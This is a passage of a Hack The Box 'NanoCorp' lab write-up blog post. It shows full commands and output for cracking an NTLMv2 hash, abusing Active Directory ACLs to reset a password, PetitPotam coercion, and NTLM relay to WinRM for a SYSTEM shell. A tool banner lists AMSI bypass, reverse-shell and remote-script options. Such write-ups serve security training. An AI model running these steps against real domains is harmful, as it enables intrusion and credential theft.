+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$john -w:/usr/share/wordlists/rockyou.txt hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">dksehdgh712!@#   (web_svc)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-11-09 00:13) 1.020g/s 1893Kp/s 1893Kc/s 1893KC/s dobson5499..djcward</span><br><span class="line">Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>It falls almost instantly, giving us our first set of valid domain credentials:</p>
+<p><code>web_svc:dksehdgh712!@#</code></p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/NanoCorp/creds.png"
+                      alt="NanoCorp-web_svc-creds"
+                ><figcaption>NanoCorp-web_svc-creds</figcaption></figure></p>
+<h2 id="Privilege-Escalation-to-monitoring-svc"><a href="#Privilege-Escalation-to-monitoring-svc" class="headerlink" title="Privilege Escalation to monitoring_svc"></a>Privilege Escalation to monitoring_svc</h2><p>With a foothold account in hand, the usual next step is to run it through BloodHound and map out where <code>web_svc</code> can go. The collected data reveals a small ACL chain: <code>web_svc</code> is able to add members to the <code>IT_SUPPORT</code> group, and <code>IT_SUPPORT</code> in turn holds <code>ForceChangePassword</code> rights over the <code>monitoring_svc</code> account. That’s a clean two-hop privilege path — add ourselves to the group, inherit the group’s rights, and reset the target’s password.</p>
+<p>Before we can touch Kerberos-backed tooling, though, we need to deal with that 7-hour clock skew from the recon phase. Kerberos rejects tickets whose timestamp drifts too far from the KDC, so every command here is prefixed with an <code>ntpdate</code> against the DC to step our clock into sync first.</p>
+<h3 id="Adding-web-svc-to-IT-SUPPORT"><a href="#Adding-web-svc-to-IT-SUPPORT" class="headerlink" title="Adding web_svc to IT_SUPPORT"></a>Adding web_svc to IT_SUPPORT</h3><p>We use <code>bloodyAD</code> with Kerberos auth (<code>-k</code>) to add <code>web_svc</code> into the <code>IT_SUPPORT</code> group:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntpdate nanocorp.htb;bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u &#x27;web_svc&#x27; -p &#x27;dksehdgh712!@#&#x27; -k add groupMember IT_SUPPORT web_svc</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">2025-11-09 07:29:29.239719 (-0500) +25199.195952 +/- 0.181110 nanocorp.htb 10.129.129.217 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25199.195952</span><br><span class="line">[+] web_svc added to IT_SUPPORT</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Resetting-the-monitoring-svc-Password"><a href="#Resetting-the-monitoring-svc-Password" class="headerlink" title="Resetting the monitoring_svc Password"></a>Resetting the monitoring_svc Password</h3><p>Now that <code>web_svc</code> is a member of <code>IT_SUPPORT</code>, it inherits the group’s <code>ForceChangePassword</code> over <code>monitoring_svc</code>. We use that to set a password of our choosing on the account:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntpdate dc01.nanocorp.htb;bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u &#x27;web_svc&#x27; -p &#x27;dksehdgh712!@#&#x27; -k set password monitoring_svc &#x27;kujenPassword123&#x27;</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">2025-11-09 07:31:47.626069 (-0500) +25199.206299 +/- 0.134115 dc01.nanocorp.htb 10.129.129.217 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25199.206299</span><br><span class="line">[+] Password changed successfully!</span><br></pre></td></tr></table></figure></div>
+
+<p>We now control <code>monitoring_svc:kujenPassword123</code>.</p>
+<h3 id="WinRM-over-HTTPS-5986-User-Flag"><a href="#WinRM-over-HTTPS-5986-User-Flag" class="headerlink" title="WinRM over HTTPS (5986) - User Flag"></a>WinRM over HTTPS (5986) - User Flag</h3><p>Remember port <code>5986</code> from the scan? <code>monitoring_svc</code> has remote-management rights, so we can authenticate to the WinRM-HTTPS endpoint with Kerberos. Using <code>evil_winrmexec.py</code> with <code>-ssl -port 5986</code> and <code>-k</code>, we request a TGT&#x2F;TGS for the WSMAN service and land a shell on the DC:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ntpdate dc01.nanocorp.htb;python3 evil_winrmexec.py -ssl -port 5986 NANOCORP.HTB/monitoring_svc:&#x27;kujenPassword123&#x27;@dc01.nanocorp.htb -k</span><br><span class="line">2025-11-09 07:33:07.557876 (-0500) +25199.171122 +/- 0.170855 dc01.nanocorp.htb 10.129.129.217 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25199.171122</span><br><span class="line">[*] &#x27;-target_ip&#x27; not specified, using dc01.nanocorp.htb</span><br><span class="line">[*] &#x27;-url&#x27; not specified, using https://dc01.nanocorp.htb:5986/wsman</span><br><span class="line">[*] &#x27;-spn&#x27; not specified, using HTTP/dc01.nanocorp.htb@NANOCORP.HTB</span><br><span class="line">[*] &#x27;-dc-ip&#x27; not specified, using NANOCORP.HTB</span><br><span class="line">[*] requesting TGT for NANOCORP.HTB\monitoring_svc</span><br><span class="line">[*] requesting TGS for HTTP/dc01.nanocorp.htb@NANOCORP.HTB</span><br><span class="line"></span><br><span class="line">Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully</span><br><span class="line">This is not an interactive shell! If you need to run programs that expect</span><br><span class="line">inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell</span><br><span class="line"></span><br><span class="line">Special !bangs:</span><br><span class="line">  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use &#x27;PATH&#x27;</span><br><span class="line">                                   # if it contains whitespace</span><br><span class="line"></span><br><span class="line">  !upload [-xor] LPATH [RPATH]     # uploads a file; use &#x27;PATH&#x27; if it contains whitespace, though use iwr</span><br><span class="line">                                   # if you can reach your ip from the box, because this can be slow;</span><br><span class="line">                                   # use -xor only in conjunction with !psrun/!netrun</span><br><span class="line"></span><br><span class="line">  !amsi                            # amsi bypass, run this right after you get a prompt</span><br><span class="line"></span><br><span class="line">  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is</span><br><span class="line">                                   # needed unless that script tries to load a .NET assembly; if you can&#x27;t reach</span><br><span class="line">                                   # your ip, !upload with -xor first, then !psrun -xor &#x27;c:\foo\bar.ps1&#x27; (needs absolute path)</span><br><span class="line"></span><br><span class="line">  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use &#x27;ARG&#x27; if it contains whitespace;</span><br><span class="line">                                   # !amsi first if you&#x27;re getting &#x27;...program with an incorrect format&#x27; errors;</span><br><span class="line">                                   # if you can&#x27;t reach your ip, !upload with -xor first then !netrun -xor &#x27;c:\foo\bar.exe&#x27; (needs absolute path)</span><br><span class="line"></span><br><span class="line">  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can&#x27;t reach your ip and you</span><br><span class="line">                                   # you need to run an executable that expects input, try:</span><br><span class="line">                                   # PS&gt; Set-Content -Encoding ASCII &#x27;stdin.txt&#x27; &quot;line1`nline2`nline3&quot;</span><br><span class="line">                                   # PS&gt; Start-Process some.exe -RedirectStandardInput &#x27;stdin.txt&#x27; -RedirectStandardOutput &#x27;stdout.txt&#x27;</span><br><span class="line"></span><br><span class="line">  !log                             # start logging output to winrmexec_[timestamp]_stdout.log</span><br><span class="line">  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log</span><br><span class="line"></span><br><span class="line">PS C:\Users\monitoring_svc\Documents&gt; cd ../desktop</span><br><span class="line">PS C:\Users\monitoring_svc\desktop&gt; cat user.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And that’s the user flag in the bag.</p>
+<h2 id="Privilege-Escalation-to-SYSTEM-Coerce-NTLM-Relay-to-WinRM"><a href="#Privilege-Escalation-to-SYSTEM-Coerce-NTLM-Relay-to-WinRM" class="headerlink" title="Privilege Escalation to SYSTEM - Coerce + NTLM Relay to WinRM"></a>Privilege Escalation to SYSTEM - Coerce + NTLM Relay to WinRM</h2><p><code>monitoring_svc</code> doesn’t have a direct path to Administrator, so for root we pivot back to a classic NTLM relay. The plan is to make the <strong>Domain Controller’s machine account</strong> authenticate to us, then relay that authentication to the DC’s own WinRM-HTTPS service (<code>winrms://</code>) — which <code>ntlmrelayx</code> now supports natively. Because the DC’s <code>DC01$</code> account is local admin on itself, a successful relay yields a SYSTEM-level shell.</p>
+<h3 id="Creating-a-DNS-Record-for-the-Relay-Listener"><a href="#Creating-a-DNS-Record-for-the-Relay-Listener" class="headerlink" title="Creating a DNS Record for the Relay Listener"></a>Creating a DNS Record for the Relay Listener</h3><p>WinRM relaying requires the coerced authentication to arrive at a target name our listener can claim. We use <code>krbrelayx</code>‘s <code>dnstool</code> (authenticating as <code>web_svc</code>, which can write DNS records to the AD-integrated zone) to add an A record pointing at our attacker IP. The odd-looking <code>localhost1UWhRCAA...</code> name is a marshalled&#x2F;encoded record that resolves back to us while satisfying the naming the coercion listener expects:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ dnstool -u &#x27;nanocorp.htb\WEB_SVC&#x27; -p &#x27;dksehdgh712!@#&#x27; nanocorp.htb -dc-ip 10.129.129.217 -dns-ip 10.129.129.217 -a add -d 10.10.16.13 -r &#x27;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA&#x27;</span><br><span class="line">[-] Connecting to host...</span><br><span class="line">[-] Binding to host</span><br><span class="line">[+] Bind OK</span><br><span class="line">[-] Adding new record</span><br><span class="line">[+] LDAP operation completed successfully</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Coercing-the-DC-with-PetitPotam"><a href="#Coercing-the-DC-with-PetitPotam" class="headerlink" title="Coercing the DC with PetitPotam"></a>Coercing the DC with PetitPotam</h3><p>With the record in place and our relay ready (next step), we coerce the DC. <code>netexec</code>‘s <code>coerce_plus</code> module fires the <code>PetitPotam</code> (<code>EfsRpcAddUsersToFile</code>) trigger, telling the DC to authenticate out to our crafted listener name:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb nanocorp.htb -u WEB_SVC -p &#x27;dksehdgh712!@#&#x27; -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</span><br><span class="line">SMB         10.129.129.217  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)</span><br><span class="line">SMB         10.129.129.217  445    DC01             [+] nanocorp.htb\WEB_SVC:dksehdgh712!@# </span><br><span class="line">COERCE_PLUS 10.129.129.217  445    DC01             VULNERABLE, PetitPotam</span><br><span class="line">COERCE_PLUS 10.129.129.217  445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Relaying-to-winrms-for-a-SYSTEM-Shell"><a href="#Relaying-to-winrms-for-a-SYSTEM-Shell" class="headerlink" title="Relaying to winrms:&#x2F;&#x2F; for a SYSTEM Shell"></a>Relaying to winrms:&#x2F;&#x2F; for a SYSTEM Shell</h3><p>On the receiving end we run <code>ntlmrelayx</code> targeting <code>winrms://10.129.129.217</code>, relaying the coerced SMB authentication to the DC’s WinRM-HTTPS service. The <code>-i</code> flag spins up an interactive shell we can connect to locally once the relay succeeds:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ ntlmrelayx.py -smb2support -t winrms://10.129.129.217 -i -debug</span><br><span class="line">Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client WINRMS loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[+] Protocol Attack WINRMS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[*] Running in relay mode to single host</span><br><span class="line">[*] Setting up SMB Server on port 445</span><br><span class="line">[*] Setting up HTTP Server on port 80</span><br><span class="line">[*] Setting up WCF Server on port 9389</span><br><span class="line">[*] Setting up RAW Server on port 6666</span><br><span class="line">[*] Setting up WinRM (HTTP) Server on port 5985</span><br><span class="line">[*] Setting up WinRMS (HTTPS) Server on port 5986</span><br><span class="line">[*] Setting up RPC Server on port 135</span><br><span class="line">[*] Multirelay disabled</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting for connections</span><br><span class="line">[*] (SMB): Received connection from 10.129.129.217, attacking target winrms://10.129.129.217</span><br><span class="line">[!] The client requested signing, relaying to WinRMS might not work!</span><br><span class="line">[*] HTTP server returned error code 500, this is expected, treating as a successful login</span><br><span class="line">[*] (SMB): Authenticating connection from /@10.129.129.217 against winrms://10.129.129.217 SUCCEED [1]</span><br><span class="line">[*] winrms:///@10.129.129.217 [1] -&gt; Started interactive WinRMS shell via TCP on 127.0.0.1:11000</span><br><span class="line">[*] All targets processed!</span><br><span class="line">[*] (SMB): Connection from 10.129.129.217 controlled, but there are no more targets left!</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The relay succeeds and <code>ntlmrelayx</code> exposes an interactive WinRMS shell locally on <code>127.0.0.1:11000</code>. We connect to it with <code>netcat</code> and confirm we’re running as <code>NT AUTHORITY\SYSTEM</code>, then read the root flag:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ nc 127.0.0.1 11000</span><br><span class="line">Type help for list of commands</span><br><span class="line"></span><br><span class="line"># whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line"># type C:\Users\Administrator\desktop\root.txt</span><br><span class="line">85885c8c5f5c947a49bf3092a0fb1300</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>And that’s NanoCorp fully rooted.</p>
+<p>Hope you liked this writeup!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: NanoCorp</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2026-06-22 21:24:38</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-06-23 17:57:52
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2026/06/22/Hackthebox-NanoCorp/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/06/16/Hackthebox-VariaType/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: VariaType</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: NanoCorp</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-nanocorp-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;nanocorp.htb </span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Initial-Foothold-CVE-2025-24071-NTLM-Hash-Leak"><span class="nav-text">Initial Foothold - CVE-2025-24071 NTLM Hash Leak</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cracking-the-NetNTLMv2-Hash"><span class="nav-text">Cracking the NetNTLMv2 Hash</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-to-monitoring-svc"><span class="nav-text">Privilege Escalation to monitoring_svc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Adding-web-svc-to-IT-SUPPORT"><span class="nav-text">Adding web_svc to IT_SUPPORT</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Resetting-the-monitoring-svc-Password"><span class="nav-text">Resetting the monitoring_svc Password</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinRM-over-HTTPS-5986-User-Flag"><span class="nav-text">WinRM over HTTPS (5986) - User Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Privilege-Escalation-to-SYSTEM-Coerce-NTLM-Relay-to-WinRM"><span class="nav-text">Privilege Escalation to SYSTEM - Coerce + NTLM Relay to WinRM</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Creating-a-DNS-Record-for-the-Relay-Listener"><span class="nav-text">Creating a DNS Record for the Relay Listener</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Coercing-the-DC-with-PetitPotam"><span class="nav-text">Coercing the DC with PetitPotam</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Relaying-to-winrms-for-a-SYSTEM-Shell"><span class="nav-text">Relaying to winrms:&#x2F;&#x2F; for a SYSTEM Shell</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
